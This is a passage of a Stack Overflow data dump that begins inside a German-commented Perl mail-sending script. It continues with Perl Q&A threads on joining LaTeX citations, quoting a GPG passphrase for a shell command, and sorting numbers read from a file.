&quot;debug \\$av_loc_FBODY: $av_loc_FBODY&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_FATT: $av_loc_FATT&quot;;\n\n#  __  __       _         _____                  \n#    \\/  |     (_)       |  __ \\                 \n#   \\  / | __ _ _ _ __   | |__) | __ ___   ___   \n#   |\\/| |/ _` | | '_ \\  |  ___/ '__/ _ \\ / __|  \n#   |  | | (_| | | | | | | |   | | | (_) | (__ _ \n#  _|  |_|\\__,_|_|_| |_| |_|   |_|  \\___/ \\___(_)\n#                                                \n#                                                \n### main procedure\n\n###\n### prepare variables\n###\nif ($av_loc_TO) \n{\n  $av_loc_TO =~s/ //u; # leerzeichen eleminieren\n  push(@av_loc_TO,split(/,/,join(',',$av_loc_TO))); # hier werden die einzelnen eintr\u00e4ge in ein array \u00fcberf\u00fchrt; trennzeichen=,\n  $av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_TO: @av_loc_TO&quot;;\n  if ($#av_loc_TO &gt;= 1) # wenn 1 oder mehr elemente im array vorhanden sind muss das array in einen komma-getrennten string \u00fcberf\u00fchrt werden\n  { \n    $av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_TO: @av_loc_TO&quot;;\n    $av_std_DEBUG &amp;&amp; print &quot;$_&quot;.&quot;\\n&quot; foreach (@av_loc_TO);\n    $av_loc_TO=''; # string l\u00f6schen\n    foreach (@av_loc_TO)\n    {\n        $av_loc_TO=$_.&quot;,&quot;.$av_loc_TO; #elemente des array mit komma getrennt zusammenf\u00fchren - vorsicht - zum schluss ist 1 komma zuviel\n    }\n    $av_loc_TO=substr($av_loc_TO,0,length($av_loc_TO)-1); # das letzte komma entfernen\n  }\n  else\n  {\n    $av_loc_TO=join(' ', @av_loc_TO);\n  }\n}\nelse\n{\n    # To darf nicht leer sein\n    exit ($?+=2); # exit mit exit status gesetzt\n}\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_TO: $av_loc_TO&quot;;\n\n\n$av_loc_CC =~s/ //u; # leerzeichen eleminieren\npush(@av_loc_CC,split(/,/,join(',',$av_loc_CC))); # hier werden die einzelnen eintr\u00e4ge in ein array \u00fcberf\u00fchrt; trennzeichen=,\n$av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_CC: @av_loc_CC&quot;;\nif ($#av_loc_CC &gt;= 1) # wenn 1 oder mehr elemente im array vorhanden sind muss das array in einen komma-getrennten string \u00fcberf\u00fchrt werden\n{ \n    $av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_CC: @av_loc_CC&quot;;\n    $av_std_DEBUG &amp;&amp; print &quot;$_&quot;.&quot;\\n&quot; foreach (@av_loc_CC);\n    $av_loc_CC=''; # string l\u00f6schen\n#   shift(@av_loc_CC);\n    foreach (@av_loc_CC)\n    {\n        $av_loc_CC=$_.&quot;,&quot;.$av_loc_CC; #elemente des array mit komma getrennt zusammenf\u00fchren - vorsicht - zum schluss ist 1 komma zuviel\n    }\n    $av_loc_CC=substr($av_loc_CC,0,length($av_loc_CC)-1); # das letzte komma entfernen\n}\nelse\n{\n    $av_loc_CC=join(' ', @av_loc_CC);\n}\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_CC: $av_loc_CC&quot;;\n\n\n#@av_loc_BCC=('dummy@av.loc');\n$av_loc_BCC =~s/ //u; # leerzeichen eleminieren\npush(@av_loc_BCC, split(/,/,join(',',$av_loc_BCC))); # hier werden die einzelnen eintr\u00e4ge in ein array \u00fcberf\u00fchrt; trennzeichen=,\n$av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_BCC: @av_loc_BCC&quot;;\nif ($#av_loc_BCC &gt;= 1) # wenn 1 oder mehr elemente im array vorhanden sind muss das array in einen komma-getrennten string \u00fcberf\u00fchrt werden\n{ \n    $av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_BCC: @av_loc_BCC&quot;;\n    $av_std_DEBUG &amp;&amp; print &quot;$_&quot;.&quot;\\n&quot; foreach (@av_loc_BCC);\n    $av_loc_BCC=''; # string l\u00f6schen\n#   shift(@av_loc_BCC);\n    foreach (@av_loc_BCC)\n    {\n        $av_loc_BCC=$_.&quot;,&quot;.$av_loc_BCC; #elemente des array mit komma getrennt zusammenf\u00fchren - vorsicht - zum schluss ist 1 komma zuviel\n    }\n    $av_loc_BCC=substr($av_loc_BCC,0,length($av_loc_BCC)-1); # das letzte komma entfernen\n}\nelse\n{\n    $av_loc_BCC=join(' ', @av_loc_BCC);\n}\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_BCC: $av_loc_BCC&quot;;\n\n\n#@av_loc_FATT=('dummy.txt');\n$av_loc_FATT =~s/ //u; # leerzeichen eleminieren\npush(@av_loc_FATT, split(/,/,join(',',$av_loc_FATT))); # hier werden die einzelnen eintr\u00e4ge in ein array \u00fcberf\u00fchrt; trennzeichen=,\n$av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_FATT: @av_loc_FATT&quot;;\nif ($#av_loc_FATT &gt;= 1) # wenn 1 oder mehr elemente im array vorhanden sind muss das array in einen komma-getrennten string \u00fcberf\u00fchrt werden\n{ \n    $av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_FATT: @av_loc_FATT&quot;;\n    $av_std_DEBUG &amp;&amp; print &quot;$_&quot;.&quot;\\n&quot; foreach (@av_loc_FATT);\n    $av_loc_FATT=''; # string l\u00f6schen\n#   shift(@av_loc_FATT);\n    foreach (@av_loc_FATT)\n    {\n        $av_loc_FATT=$_.&quot;,&quot;.$av_loc_FATT; #elemente des array mit komma getrennt zusammenf\u00fchren - vorsicht - zum schluss ist 1 komma zuviel\n    }\n    $av_loc_FATT=substr($av_loc_FATT,0,length($av_loc_FATT)-1); # das letzte komma entfernen\n}\nelse\n{\n    $av_loc_FATT=join(' ', @av_loc_FATT);\n}\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_FATT: $av_loc_FATT&quot;;\n\n@av_loc_FATT=($av_loc_FATT);\n$av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_FATT: @av_loc_FATT&quot;;\nforeach $av_tmp_STRING (@av_loc_FATT)\n{\n  if ( !-f &quot;$av_tmp_STRING&quot; )\n  {\n    say &quot;$av_tmp_STRING existiert nicht&quot;;\n    exit ($?+=4);\n  }\n}\n\n$Mail::Sender::NO_X_MAILER=1; # wichtig der unterdr\u00fcckt eine meldung im header wo auf das skript r\u00fcckschl\u00fcsse gezogen werden kann.\n\n$av_loc_FROMN = Encode::encode(&quot;MIME-Q&quot;, Encode::decode('UTF-8', $av_loc_FROMN));\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_FROMN: $av_loc_FROMN&quot;;\n$av_loc_SUBJECT = Encode::encode(&quot;MIME-Q&quot;, Encode::decode('utf8', $av_loc_SUBJECT));\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_SUBJECT: $av_loc_SUBJECT&quot;;\n\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_TO: $av_loc_TO&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_CC: $av_loc_CC&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_BCC: $av_loc_BCC&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_FROMN: $av_loc_FROMN&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_FROME: $av_loc_FROME&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_SUBJECT: $av_loc_SUBJECT&quot;;\n\n\nref ($av_tmp_MAIL = new Mail::Sender \n{ \n    from =&gt; $av_loc_FROMN.'&lt;'.$av_loc_FROME.'&gt;',\n    replyto =&gt; $av_loc_FROME,\n    to =&gt; $av_loc_TO,\n    cc =&gt; $av_loc_CC,\n    bcc =&gt; $av_loc_BCC,\n  smtp =&gt; 'smtp.av.loc',\n}\n) or $av_std_DEBUG &amp;&amp; say &quot;debug Return code $av_tmp_MAIL&quot; and exit (1);\n$av_std_DEBUG &amp;&amp; $Mail::Sender::Error &amp;&amp; say &quot;\\$Mail::Sender::Error: $Mail::Sender::Error&quot; &amp;&amp; exit (1);\n\n\n$av_tmp_MAIL-&gt;OpenMultipart (\n  {\n    subject =&gt; $av_loc_SUBJECT,\n    encoding =&gt; &quot;Quoted-printable&quot;,\n    multipart =&gt; 'Mixed',\n    charset =&gt; 'UTF-8',\n  }\n);\n$av_std_DEBUG &amp;&amp; $Mail::Sender::Error &amp;&amp; say &quot;\\$Mail::Sender::Error: $Mail::Sender::Error&quot; &amp;&amp; exit (1);\n\n\nopen(BODY, '&lt;', &quot;$av_loc_FBODY&quot;) || # zum Lesen ge\u00f6ffnet\n  say &quot;debug: Cannot open file $av_loc_FBODY for reading! error: $!&quot; &amp;&amp; exit (1);\n\n$av_tmp_STRING='';\nwhile(my $eingabe=&lt;BODY&gt;){\n  chomp($eingabe);\n  $av_tmp_STRING = $av_tmp_STRING.Encode::decode(&quot;UTF-8&quot;, $eingabe).&quot;\\r\\n&quot;;\n}\n$av_std_DEBUG &amp;&amp; say &quot;$av_tmp_STRING&quot;;\n\nclose(BODY); \n$av_std_DEBUG &amp;&amp; say &quot;debug \\$ERRNO: $!&quot;;\n\n$av_tmp_MAIL-&gt;Body (\n  {\n    charset =&gt; 'UTF-8',\n    encoding =&gt; 'Quoted-printable',\n    ctype =&gt; 'text/plain',\n    msg =&gt; $av_tmp_STRING,\n  }\n);\n$av_std_DEBUG &amp;&amp; $Mail::Sender::Error &amp;&amp; say &quot;\\$Mail::Sender::Error: $Mail::Sender::Error&quot; &amp;&amp; exit (1);\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$ERRNO: $!&quot;;\n\n\n$av_tmp_MAIL-&gt;Attach(\n{\n    description =&gt; 'Grundwasser Statistikdaten',\n  file =&gt; @av_loc_FATT,\n}\n);\n$av_std_DEBUG &amp;&amp; $Mail::Sender::Error &amp;&amp; say &quot;\\$Mail::Sender::Error: $Mail::Sender::Error&quot; &amp;&amp; exit (1);\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$ERRNO: $!&quot;;\n\n$av_tmp_MAIL-&gt;Close;\n$av_std_DEBUG &amp;&amp; $Mail::Sender::Error &amp;&amp; say &quot;\\$Mail::Sender::Error: $Mail::Sender::Error&quot; &amp;&amp; exit (1);\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$ERRNO: $!&quot;;\n\n#  ______           _   _____                  \n# |  ____|         | | |  __ \\                 \n# | |__   _ __   __| | | |__) | __ ___   ___   \n# |  __| | '_ \\ / _` | |  ___/ '__/ _ \\ / __|  \n# | |____| | | | (_| | | |   | | | (_) | (__ _ \n# |______|_| |_|\\__,_| |_|   |_|  \\___/ \\___(_)\n#                                              \n#                                              \n### end procedure\n&amp;av_logit(&quot;beendet&quot;);\nexit (0);\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 3621, "user_id": 6188402, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/a8bdb7cbe81f5544f0ddc6ded12a23f1?s=128&d=identicon&r=PG&f=1", "display_name": "Washington Guedes", "link": "https://stackoverflow.com/users/6188402/washington-guedes"}, "edited": false, "score": 1, "creation_date": 1462541681, "post_id": 37073688, "comment_id": 61692125, "body": "I don&#39;t know much of perl, but why don&#39;t you join the array matches and add a dot at the end?"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 3621, "user_id": 6188402, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/a8bdb7cbe81f5544f0ddc6ded12a23f1?s=128&d=identicon&r=PG&f=1", "display_name": "Washington Guedes", "link": "https://stackoverflow.com/users/6188402/washington-guedes"}, "edited": false, "score": 0, "creation_date": 1462542655, "post_id": 37073688, "comment_id": 61692804, "body": "@user6188402: Based and on the requirement we need to insert end punctuation at the end of the statement or sentence. The number of the items should be splitted by comma or semicolon whatever it may be. However we need end period at the end of the line."}], "answers": [{"comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1462543359, "post_id": 37073839, "comment_id": 61693331, "body": "Output is ok... there is way in inside while loop?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462544174, "post_id": 37073839, "comment_id": 61693899, "body": "Why do you want to do it inside the loop?"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462549712, "post_id": 37073839, "comment_id": 61697677, "body": "@Borodin: This is just my request if there is a way for simplifying into the while loop. For example if I want to store all the list items in array and I don&#39;t want to alter the arrays once stored. May be in future there is a chance in a perl code to write in some situation. That&#39;s all."}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": false, "score": 7, "last_activity_date": 1462541824, "creation_date": 1462541824, "answer_id": 37073839, "question_id": 37073688, "link": "https://stackoverflow.com/questions/37073688/in-array-listitem-how-to-store-values-with-comma-separation-and-end-with-dot-usi/37073839#37073839", "title": "In array listitem how to store values with comma separation and end with dot using perl", "body": "<p>You can add the comma and period after the fact:</p>\n\n<pre><code>while($tmp=~m/\\\\bibitem\\[([^\\[\\]]*)\\]{([^\\{\\}]*)}/g){\n   push(@biblables, \"\\\\cite{$2}\");\n}\n\nprint join ', ', @biblables;\nprint \".\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "is_accepted": false, "score": 1, "last_activity_date": 1462553301, "creation_date": 1462553301, "answer_id": 37077579, "question_id": 37073688, "link": "https://stackoverflow.com/questions/37073688/in-array-listitem-how-to-store-values-with-comma-separation-and-end-with-dot-usi/37077579#37077579", "title": "In array listitem how to store values with comma separation and end with dot using perl", "body": "<p>If you're determine to add the comma's and dots to the elements when<br>\nmatching in the regex while loop, it can be done like this.  </p>\n\n<p>Since you don't know the total matches yet, just keep a reference to<br>\nthe most recently pushed element.<br>\nThen append the <code>,</code> or <code>.</code> as needed.  </p>\n\n<p>Code  </p>\n\n<pre><code>use strict;\nuse warnings;\n\n$/ = undef;\n\nmy $tmp = &lt;DATA&gt;;\nmy @biblables = ();\nmy $ref = undef;\n\nwhile( $tmp =~ /\\\\bibitem\\[([^\\[\\]]*)\\]{([^\\{\\}]*)}/g )\n{\n   $$ref .= \", \" if defined $ref;\n   $ref = \\$biblables[ push(@biblables,\"\\\\cite{$2}\") ];\n}\n$$ref .= \".\" if defined $ref;\n\nprint @biblables;\n\n__DATA__    \n\\bibitem[{BuI (2001)}]{BuI2001}    \n\\bibitem[{BuII (2002)}]{BuI2002}    \n\\bibitem[{BuIII (2003)}]{BuI2003}    \n\\bibitem[{BuIV (2004)}]{BuI2004}    \n\\bibitem[{BuV (2005)}]{BuI2005}    \n\\bibitem[{BuVI (2006)}]{BuI2006}\n</code></pre>\n\n<p>Output  </p>\n\n<pre><code>\\cite{BuI2001}, \\cite{BuI2002}, \\cite{BuI2003}, \\cite{BuI2004}, \\cite{BuI2005}, \\cite{BuI2006}.\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1462816776, "last_edit_date": 1462816776, "creation_date": 1462576707, "answer_id": 37082712, "question_id": 37073688, "link": "https://stackoverflow.com/questions/37073688/in-array-listitem-how-to-store-values-with-comma-separation-and-end-with-dot-usi/37082712#37082712", "title": "In array listitem how to store values with comma separation and end with dot using perl", "body": "<p>If you read from a filehandle you can use <code>eof</code> to determine that you are on the last line, at which point you replace the comma by the dot in the last element.  This allows you to build the array completely in the loop, as required.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nopen my $fh, '&lt;', 'bibitems.txt';\n\nmy @biblabels;\n\nwhile (&lt;$fh&gt;) {\n    push @biblabels, \"\\\\cite{$2},\" if /\\\\bibitem\\[([^\\[\\]]*)\\]{([^\\{\\}]*)}/;\n    $biblabels[-1] =~ tr/,/./      if eof;\n}\n\nprint \"$_ \" for @biblabels;\nprint \"\\n\";\n</code></pre>\n\n<p>This prints your desired output.</p>\n\n<p>The <code>oef</code> returns true if the next read will return <em>end-of-file</em>. This means that you've just read the last line, which got put on the array if it matched. This function is rarely needed but here it seems to find a fitting purpose. Note that <code>eof</code> and <code>eof()</code> behave a little differently. Please see the <a href=\"http://perldoc.perl.org/functions/eof.html\" rel=\"nofollow\">eof</a> page.</p>\n\n<hr>\n\n<p>If the other capture in the regex is meant to be used change the above to <code>if (...) { ... }</code>. Note that what is in <code>{}</code> is in Latex called <em>citation keys</em>, while the (optional) <em>labels</em> are things inside <code>[]</code>. I'd go with the array name of <code>@citkeys</code> for clarity.</p>\n"}], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 320, "favorite_count": 0, "accepted_answer_id": 37082712, "answer_count": 3, "score": 0, "last_activity_date": 1462816776, "creation_date": 1462541391, "last_edit_date": 1462544689, "question_id": 37073688, "link": "https://stackoverflow.com/questions/37073688/in-array-listitem-how-to-store-values-with-comma-separation-and-end-with-dot-usi", "title": "In array listitem how to store values with comma separation and end with dot using perl", "body": "<pre><code> use strict;\n use warnings;\n\n my $tmp = join \"\\n\", &lt;DATA&gt;;\n my @biblables = ();\n</code></pre>\n\n<p>List items will be fetched and storing into @biblables in a while loop</p>\n\n<pre><code> while($tmp=~m/\\\\bibitem\\[([^\\[\\]]*)\\]{([^\\{\\}]*)}/g)\n {\n      push(@biblables, \"\\\\cite{$2}, \");\n }\n\n print @biblables;\n</code></pre>\n\n<p>While printing this we are getting the output like as:</p>\n\n<pre><code> \\cite{BuI2001},\\cite{BuI2002},\\cite{BuI2003},\\cite{BuI2004},\\cite{BuI2005},\\cite{BuI2006},\n</code></pre>\n\n<p>However we need the output like this</p>\n\n<pre><code> \\cite{BuI2001},\\cite{BuI2002},\\cite{BuI2003},\\cite{BuI2004},\\cite{BuI2005},\\cite{BuI2006}.\n</code></pre>\n\n<p>Hence we can use post regex to insert dot at the end of the listitem in array</p>\n\n<pre><code> while($tmp=~m/\\\\bibitem\\[([^\\[\\]]*)\\]{([^\\{\\}]*)}/g)\n {\n      my $post = $';\n      if($post!~m/\\\\bibitem\\[([^\\[\\]]*)\\]{([^\\{\\}]*)}/)\n      {  push(@biblables, \"\\\\cite{$2}.\");  }\n      else {  push(@biblables, \"\\\\cite{$2}, \");  }\n }\n\n print @biblables;\n</code></pre>\n\n<p>Could you please advise me if there is short way to get this output</p>\n\n<pre><code>#\n__DATA__    \n\\bibitem[{BuI (2001)}]{BuI2001}    \n\\bibitem[{BuII (2002)}]{BuI2002}    \n\\bibitem[{BuIII (2003)}]{BuI2003}    \n\\bibitem[{BuIV (2004)}]{BuI2004}    \n\\bibitem[{BuV (2005)}]{BuI2005}    \n\\bibitem[{BuVI (2006)}]{BuI2006}\n</code></pre>\n"}, {"tags": ["perl", "shell", "gnupg"], "comments": [{"owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 0, "creation_date": 1462539765, "post_id": 37071623, "comment_id": 61690822, "body": "by the way, back-ticks are used to capture the output of a shell command.  If you don&#39;t want that output and just want to run the command, you should be using <code>system()</code> instead."}, {"owner": {"reputation": 33721, "user_id": 695343, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/KX04R.jpg?s=128&g=1", "display_name": "Jens Erat", "link": "https://stackoverflow.com/users/695343/jens-erat"}, "edited": false, "score": 0, "creation_date": 1462545353, "post_id": 37071623, "comment_id": 61694719, "body": "Never do this on a multi-user machine -- all other users can see what parameters you passed to a process. Use <code>--passphrase-file</code> or <code>--passphrase-fd</code> instead."}, {"owner": {"reputation": 686, "user_id": 1394339, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/ugIX7.jpg?s=128&g=1", "display_name": "Elliot Rodriguez", "link": "https://stackoverflow.com/users/1394339/elliot-rodriguez"}, "reply_to_user": {"reputation": 33721, "user_id": 695343, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/KX04R.jpg?s=128&g=1", "display_name": "Jens Erat", "link": "https://stackoverflow.com/users/695343/jens-erat"}, "edited": false, "score": 0, "creation_date": 1462551822, "post_id": 37071623, "comment_id": 61698969, "body": "@JensErat this is not a multi-user machine. Thank you for the suggestion, however."}], "answers": [{"tags": [], "owner": {"reputation": 17784, "user_id": 1646322, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d9fd7a75e0d8ace7bb3276476786c2c0?s=128&d=identicon&r=PG", "display_name": "Ruslan Osmanov", "link": "https://stackoverflow.com/users/1646322/ruslan-osmanov"}, "is_accepted": false, "score": 1, "last_activity_date": 1462536718, "last_edit_date": 1462536718, "creation_date": 1462536264, "answer_id": 37071950, "question_id": 37071623, "link": "https://stackoverflow.com/questions/37071623/escaping-parentheses-when-sending-gpg-passphrase-to-a-perl-script/37071950#37071950", "title": "Escaping parentheses when sending GPG passphrase to a Perl script", "body": "<p>Enclose the variables in quotes:</p>\n\n<pre><code>gpg --passphrase \"$gpgpp\" --batch -o \"$gpgofile\" -d \"$file\"\n</code></pre>\n\n<p>Otherwise, the shell will try to interpret contents of the variables as expressions.</p>\n"}, {"comments": [{"owner": {"reputation": 686, "user_id": 1394339, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/ugIX7.jpg?s=128&g=1", "display_name": "Elliot Rodriguez", "link": "https://stackoverflow.com/users/1394339/elliot-rodriguez"}, "edited": false, "score": 1, "creation_date": 1462541374, "post_id": 37073104, "comment_id": 61691895, "body": "Marked as answer. Thank you - supporting an existing script and my Perl experience is limited - I was not aware of these sequences!"}], "tags": [], "owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "is_accepted": true, "score": 3, "last_activity_date": 1462539610, "creation_date": 1462539610, "answer_id": 37073104, "question_id": 37071623, "link": "https://stackoverflow.com/questions/37071623/escaping-parentheses-when-sending-gpg-passphrase-to-a-perl-script/37073104#37073104", "title": "Escaping parentheses when sending GPG passphrase to a Perl script", "body": "<p>The <code>\\Q</code> and <code>\\E</code> escape sequences are used to escape all \"special\" characters between them.</p>\n\n<pre><code>`gpg --passphrase \\Q$gpgpp\\E --batch -o $gpgofile -d $file`;\n</code></pre>\n\n<p>This should be done any time you have a variable that may contain characters which need to be escaped.</p>\n\n<p><a href=\"http://perldoc.perl.org/functions/quotemeta.html\" rel=\"nofollow\">http://perldoc.perl.org/functions/quotemeta.html</a></p>\n"}], "owner": {"reputation": 686, "user_id": 1394339, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/ugIX7.jpg?s=128&g=1", "display_name": "Elliot Rodriguez", "link": "https://stackoverflow.com/users/1394339/elliot-rodriguez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 603, "favorite_count": 0, "accepted_answer_id": 37073104, "answer_count": 2, "score": 2, "last_activity_date": 1462539610, "creation_date": 1462535329, "question_id": 37071623, "link": "https://stackoverflow.com/questions/37071623/escaping-parentheses-when-sending-gpg-passphrase-to-a-perl-script", "title": "Escaping parentheses when sending GPG passphrase to a Perl script", "body": "<p>I am having some difficulty with a Perl script that is invoked from cron.</p>\n\n<p>One of the arguments for the script is a GPG passphrase. This is later interpolated into a string that is sent to the shell.</p>\n\n<p>This particular passphrase contains an open parentheses, and the script fails with a \"syntax error near unexpected token `(\" error.</p>\n\n<p>This is the offending part of the phrase:</p>\n\n<pre><code>m3(\u00c3\u00dd4\u00fa\u00c5\u00a4;:q!\n</code></pre>\n\n<p>I have tried single and double quoting it before the value is used in the script, but that does not have an effect. </p>\n\n<p>The phrase works correctly when invoking GPG directly from the shell, just not when it gets interpolated into the following:</p>\n\n<pre><code>`gpg --passphrase $gpgpp --batch -o $gpgofile -d $file`;\n</code></pre>\n\n<p>Where $gpgpp is the passphrase variable.</p>\n\n<p>What is the correct way to escape this, and other potentially problematic characters?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1462539231, "post_id": 37071500, "comment_id": 61690511, "body": "<i>There are two strings with digits</i>, So, either you need to cocatenate those strings or may be split it according to your need to make it numeric."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 3, "creation_date": 1462540959, "post_id": 37071500, "comment_id": 61691596, "body": "Please <a href=\"https://stackoverflow.com/posts/37071500/edit\">edit</a> the question and add example input or we cannot help you."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462543985, "post_id": 37071500, "comment_id": 61693764, "body": "Change your assignment to <code>@file_content = map &#47;\\d+&#47;g, &lt;FD&gt;</code>"}, {"owner": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1462884928, "post_id": 37071500, "comment_id": 61817123, "body": "example 7  87  2 68 55 40 92 23 92 75 \\n 65 83 47 10 83 46 45 30 43 6 \\n 70 79 77 83 95 24 35 74 92 19  \\n"}], "answers": [{"comments": [{"owner": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1462539817, "post_id": 37071698, "comment_id": 61690864, "body": "Thank you Sebastian. I need to read some digits from file, sort it and write to another. chomp doesn&#39;t help. If I use text sort, I catched following problem                                                                                  65 83 47 10 83 46 45 30 43 6  7 87 2 68 55 40 92 23 92 75  70 79 77 83 95 24 35 74 92 19"}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 57, "user_id": 6300056, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-lGVXaXvaOgA/AAAAAAAAAAI/AAAAAAAAADg/OTQRVZ1nlaQ/photo.jpg?sz=128", "display_name": "Viktor Predybaylo", "link": "https://stackoverflow.com/users/6300056/viktor-predybaylo"}, "edited": false, "score": 0, "creation_date": 1462547327, "post_id": 37071698, "comment_id": 61696079, "body": "Did you try the <code>print</code> within sort to find the reason for the warning? Maybe a leading space on 